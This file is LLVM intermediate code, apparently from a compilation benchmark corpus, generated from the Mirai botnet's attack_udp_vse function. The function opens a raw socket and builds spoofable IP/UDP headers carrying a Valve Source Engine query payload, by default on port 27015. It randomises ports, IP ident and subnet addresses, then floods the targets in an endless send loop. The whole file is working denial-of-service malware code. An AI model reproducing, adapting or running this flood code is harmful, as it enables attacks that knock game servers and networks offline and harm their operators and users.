; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_attack_udp_vse.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_attack_udp_vse.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i8* }
%struct.attack_option = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i32, i64, i32, i32, i32, i8*, i8* }
%struct.udphdr = type { i8*, i8*, i64, i8* }
%struct.sockaddr = type { i32 }

@ATK_OPT_IP_TOS = common dso_local global i32 0, align 4
@ATK_OPT_IP_IDENT = common dso_local global i32 0, align 4
@ATK_OPT_IP_TTL = common dso_local global i32 0, align 4
@ATK_OPT_IP_DF = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@ATK_OPT_SPORT = common dso_local global i32 0, align 4
@ATK_OPT_DPORT = common dso_local global i32 0, align 4
@TABLE_ATK_VSE = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@LOCAL_ADDR = common dso_local global i32 0, align 4
@TRUE = common dso_local global i64 0, align 8
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_udp_vse(i32 %0, %struct.attack_target* %1, i32 %2, %struct.attack_option* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  store i32 %0, i32* %5, align 4
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i32 %2, i32* %7, align 4
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %26 = load i32, i32* %5, align 4
  %27 = call i8* @calloc(i32 %26, i32 8)
  %28 = bitcast i8* %27 to i8**
  store i8** %28, i8*** %11, align 8
  %29 = load i32, i32* %7, align 4
  %30 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %31 = load i32, i32* @ATK_OPT_IP_TOS, align 4
  %32 = call i8* @attack_get_opt_int(i32 %29, %struct.attack_option* %30, i32 %31, i32 0)
  %33 = ptrtoint i8* %32 to i32
  store i32 %33, i32* %12, align 4
  %34 = load i32, i32* %7, align 4
  %35 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %36 = load i32, i32* @ATK_OPT_IP_IDENT, align 4
  %37 = call i8* @attack_get_opt_int(i32 %34, %struct.attack_option* %35, i32 %36, i32 65535)
  %38 = ptrtoint i8* %37 to i32
  store i32 %38, i32* %13, align 4
  %39 = load i32, i32* %7, align 4
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = load i32, i32* @ATK_OPT_IP_TTL, align 4
  %42 = call i8* @attack_get_opt_int(i32 %39, %struct.attack_option* %40, i32 %41, i32 64)
  %43 = ptrtoint i8* %42 to i32
  store i32 %43, i32* %14, align 4
  %44 = load i32, i32* %7, align 4
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = load i32, i32* @ATK_OPT_IP_DF, align 4
  %47 = load i32, i32* @FALSE, align 4
  %48 = call i8* @attack_get_opt_int(i32 %44, %struct.attack_option* %45, i32 %46, i32 %47)
  store i8* %48, i8** %15, align 8
  %49 = load i32, i32* %7, align 4
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = load i32, i32* @ATK_OPT_SPORT, align 4
  %52 = call i8* @attack_get_opt_int(i32 %49, %struct.attack_option* %50, i32 %51, i32 65535)
  %53 = ptrtoint i8* %52 to i32
  store i32 %53, i32* %16, align 4
  %54 = load i32, i32* %7, align 4
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = load i32, i32* @ATK_OPT_DPORT, align 4
  %57 = call i8* @attack_get_opt_int(i32 %54, %struct.attack_option* %55, i32 %56, i32 27015)
  %58 = ptrtoint i8* %57 to i32
  store i32 %58, i32* %17, align 4
  %59 = load i32, i32* @TABLE_ATK_VSE, align 4
  %60 = call i32 @table_unlock_val(i32 %59)
  %61 = load i32, i32* @TABLE_ATK_VSE, align 4
  %62 = call i8* @table_retrieve_val(i32 %61, i32* %19)
  store i8* %62, i8** %18, align 8
  %63 = load i32, i32* @AF_INET, align 4
  %64 = load i32, i32* @SOCK_RAW, align 4
  %65 = load i32, i32* @IPPROTO_UDP, align 4
  %66 = call i32 @socket(i32 %63, i32 %64, i32 %65)
  store i32 %66, i32* %10, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

68:                                               ; preds = %4
  br label %290

69:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %70 = load i32, i32* %10, align 4
  %71 = load i32, i32* @IPPROTO_IP, align 4
  %72 = load i32, i32* @IP_HDRINCL, align 4
  %73 = call i32 @setsockopt(i32 %70, i32 %71, i32 %72, i32* %9, i32 4)
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %78

75:                                               ; preds = %69
  %76 = load i32, i32* %10, align 4
  %77 = call i32 @close(i32 %76)
  br label %290

78:                                               ; preds = %69
  store i32 0, i32* %9, align 4
  br label %79

79:                                               ; preds = %167, %78
  %80 = load i32, i32* %9, align 4
  %81 = load i32, i32* %5, align 4
  %82 = icmp slt i32 %80, %81
  br i1 %82, label %83, label %170

83:                                               ; preds = %79
  %84 = call i8* @calloc(i32 128, i32 1)
  %85 = load i8**, i8*** %11, align 8
  %86 = load i32, i32* %9, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8*, i8** %85, i64 %87
  store i8* %84, i8** %88, align 8
  %89 = load i8**, i8*** %11, align 8
  %90 = load i32, i32* %9, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8*, i8** %89, i64 %91
  %93 = load i8*, i8** %92, align 8
  %94 = bitcast i8* %93 to %struct.iphdr*
  store %struct.iphdr* %94, %struct.iphdr** %20, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %96 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %95, i64 1
  %97 = bitcast %struct.iphdr* %96 to %struct.udphdr*
  store %struct.udphdr* %97, %struct.udphdr** %21, align 8
  %98 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %99 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %98, i64 1
  %100 = bitcast %struct.udphdr* %99 to i8*
  store i8* %100, i8** %22, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 0
  store i32 4, i32* %102, align 8
  %103 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %104 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %103, i32 0, i32 1
  store i32 5, i32* %104, align 4
  %105 = load i32, i32* %12, align 4
  %106 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 2
  store i32 %105, i32* %107, align 8
  %108 = load i32, i32* %19, align 4
  %109 = sext i32 %108 to i64
  %110 = add i64 100, %109
  %111 = trunc i64 %110 to i32
  %112 = call i8* @htons(i32 %111)
  %113 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 10
  store i8* %112, i8** %114, align 8
  %115 = load i32, i32* %13, align 4
  %116 = call i8* @htons(i32 %115)
  %117 = ptrtoint i8* %116 to i32
  %118 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %119 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %118, i32 0, i32 3
  store i32 %117, i32* %119, align 4
  %120 = load i32, i32* %14, align 4
  %121 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i32 0, i32 4
  store i32 %120, i32* %122, align 8
  %123 = load i8*, i8** %15, align 8
  %124 = icmp ne i8* %123, null
  br i1 %124, label %125, label %129

125:                                              ; preds = %83
  %126 = call i8* @htons(i32 16384)
  %127 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 9
  store i8* %126, i8** %128, align 8
  br label %129

129:                                              ; preds = %125, %83
  %130 = load i32, i32* @IPPROTO_UDP, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 8
  store i32 %130, i32* %132, align 8
  %133 = load i32, i32* @LOCAL_ADDR, align 4
  %134 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 7
  store i32 %133, i32* %135, align 4
  %136 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 2
  %141 = load i32, i32* %140, align 8
  %142 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 6
  store i32 %141, i32* %143, align 8
  %144 = load i32, i32* %16, align 4
  %145 = call i8* @htons(i32 %144)
  %146 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %147 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %146, i32 0, i32 3
  store i8* %145, i8** %147, align 8
  %148 = load i32, i32* %17, align 4
  %149 = call i8* @htons(i32 %148)
  %150 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %151 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %150, i32 0, i32 0
  store i8* %149, i8** %151, align 8
  %152 = load i32, i32* %19, align 4
  %153 = sext i32 %152 to i64
  %154 = add i64 36, %153
  %155 = trunc i64 %154 to i32
  %156 = call i8* @htons(i32 %155)
  %157 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %158 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %157, i32 0, i32 1
  store i8* %156, i8** %158, align 8
  %159 = load i8*, i8** %22, align 8
  %160 = bitcast i8* %159 to i32*
  store i32 -1, i32* %160, align 4
  %161 = load i8*, i8** %22, align 8
  %162 = getelementptr inbounds i8, i8* %161, i64 4
  store i8* %162, i8** %22, align 8
  %163 = load i8*, i8** %22, align 8
  %164 = load i8*, i8** %18, align 8
  %165 = load i32, i32* %19, align 4
  %166 = call i32 @util_memcpy(i8* %163, i8* %164, i32 %165)
  br label %167

167:                                              ; preds = %129
  %168 = load i32, i32* %9, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %9, align 4
  br label %79

170:                                              ; preds = %79
  br label %171

171:                                              ; preds = %289, %170
  %172 = load i64, i64* @TRUE, align 8
  %173 = icmp ne i64 %172, 0
  br i1 %173, label %174, label %290

174:                                              ; preds = %171
  store i32 0, i32* %9, align 4
  br label %175

175:                                              ; preds = %286, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i32, i32* %5, align 4
  %178 = icmp slt i32 %176, %177
  br i1 %178, label %179, label %289

179:                                              ; preds = %175
  %180 = load i8**, i8*** %11, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds i8*, i8** %180, i64 %182
  %184 = load i8*, i8** %183, align 8
  store i8* %184, i8** %23, align 8
  %185 = load i8*, i8** %23, align 8
  %186 = bitcast i8* %185 to %struct.iphdr*
  store %struct.iphdr* %186, %struct.iphdr** %24, align 8
  %187 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i64 1
  %189 = bitcast %struct.iphdr* %188 to %struct.udphdr*
  store %struct.udphdr* %189, %struct.udphdr** %25, align 8
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 0
  %195 = load i32, i32* %194, align 8
  %196 = icmp slt i32 %195, 32
  br i1 %196, label %197, label %219

197:                                              ; preds = %179
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i32, i32* %202, align 8
  %204 = call i64 @ntohl(i32 %203)
  %205 = call i8* (...) @rand_next()
  %206 = ptrtoint i8* %205 to i32
  %207 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i32 0, i32 0
  %212 = load i32, i32* %211, align 8
  %213 = ashr i32 %206, %212
  %214 = sext i32 %213 to i64
  %215 = add nsw i64 %204, %214
  %216 = call i32 @htonl(i64 %215)
  %217 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 6
  store i32 %216, i32* %218, align 8
  br label %219

219:                                              ; preds = %197, %179
  %220 = load i32, i32* %13, align 4
  %221 = icmp eq i32 %220, 65535
  br i1 %221, label %222, label %227

222:                                              ; preds = %219
  %223 = call i8* (...) @rand_next()
  %224 = ptrtoint i8* %223 to i32
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 3
  store i32 %224, i32* %226, align 4
  br label %227

227:                                              ; preds = %222, %219
  %228 = load i32, i32* %16, align 4
  %229 = icmp eq i32 %228, 65535
  br i1 %229, label %230, label %234

230:                                              ; preds = %227
  %231 = call i8* (...) @rand_next()
  %232 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %233 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %232, i32 0, i32 3
  store i8* %231, i8** %233, align 8
  br label %234

234:                                              ; preds = %230, %227
  %235 = load i32, i32* %17, align 4
  %236 = icmp eq i32 %235, 65535
  br i1 %236, label %237, label %241

237:                                              ; preds = %234
  %238 = call i8* (...) @rand_next()
  %239 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  store i8* %238, i8** %240, align 8
  br label %241

241:                                              ; preds = %237, %234
  %242 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 5
  store i64 0, i64* %243, align 8
  %244 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %245 = bitcast %struct.iphdr* %244 to i32*
  %246 = call i64 @checksum_generic(i32* %245, i32 64)
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 5
  store i64 %246, i64* %248, align 8
  %249 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %250 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %249, i32 0, i32 2
  store i64 0, i64* %250, align 8
  %251 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %252 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %253 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 1
  %255 = load i8*, i8** %254, align 8
  %256 = load i32, i32* %19, align 4
  %257 = sext i32 %256 to i64
  %258 = add i64 36, %257
  %259 = trunc i64 %258 to i32
  %260 = call i64 @checksum_tcpudp(%struct.iphdr* %251, %struct.udphdr* %252, i8* %255, i32 %259)
  %261 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %262 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %261, i32 0, i32 2
  store i64 %260, i64* %262, align 8
  %263 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 0
  %265 = load i8*, i8** %264, align 8
  %266 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %267 = load i32, i32* %9, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i64 %268
  %270 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %269, i32 0, i32 1
  %271 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %270, i32 0, i32 0
  store i8* %265, i8** %271, align 8
  %272 = load i32, i32* %10, align 4
  %273 = load i8*, i8** %23, align 8
  %274 = load i32, i32* %19, align 4
  %275 = sext i32 %274 to i64
  %276 = add i64 100, %275
  %277 = trunc i64 %276 to i32
  %278 = load i32, i32* @MSG_NOSIGNAL, align 4
  %279 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %280 = load i32, i32* %9, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %279, i64 %281
  %283 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %282, i32 0, i32 1
  %284 = bitcast %struct.TYPE_2__* %283 to %struct.sockaddr*
  %285 = call i32 @sendto(i32 %272, i8* %273, i32 %277, i32 %278, %struct.sockaddr* %284, i32 4)
  br label %286

286:                                              ; preds = %241
  %287 = load i32, i32* %9, align 4
  %288 = add nsw i32 %287, 1
  store i32 %288, i32* %9, align 4
  br label %175

289:                                              ; preds = %175
  br label %171

290:                                              ; preds = %68, %75, %171
  ret void
}

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i8* @attack_get_opt_int(i32, %struct.attack_option*, i32, i32) #1

declare dso_local i32 @table_unlock_val(i32) #1

declare dso_local i8* @table_retrieve_val(i32, i32*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @util_memcpy(i8*, i8*, i32) #1

declare dso_local i32 @htonl(i64) #1

declare dso_local i64 @ntohl(i32) #1

declare dso_local i8* @rand_next(...) #1

declare dso_local i64 @checksum_generic(i32*, i32) #1

declare dso_local i64 @checksum_tcpudp(%struct.iphdr*, %struct.udphdr*, i8*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
